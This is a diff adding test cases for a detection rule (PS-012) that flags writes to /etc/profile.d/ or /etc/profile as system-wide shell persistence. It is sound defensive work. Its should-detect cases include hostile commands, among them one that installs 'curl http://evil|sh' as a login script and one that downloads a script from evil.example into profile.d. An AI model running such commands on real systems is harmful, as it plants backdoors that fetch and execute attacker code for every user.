@@ -1,0 +1,18 @@
+# PS-012: System-wide shell init persistence
+# Test cases for snapshot testing
+# Detects writes into /etc/profile.d/ or /etc/profile, which run for every
+# login shell of every user — a distinct persistence vector from per-user
+# dotfiles (PS-003). MITRE T1546.004.
+
+# === Cases that SHOULD be detected ===
+echo 'curl http://evil|sh' > /etc/profile.d/backdoor.sh
+cp payload.sh /etc/profile.d/00-init.sh
+echo 'export EVIL=1' >> /etc/profile
+tee /etc/profile.d/hook.sh < payload
+curl http://evil.example/x.sh -o /etc/profile.d/x.sh
+
+# === Cases that should NOT be detected (benign) ===
+cat /etc/profile.d/nvm.sh
+source /etc/profile.d/bash_completion.sh
+ls /etc/profile.d/
+echo "$PROFILE"
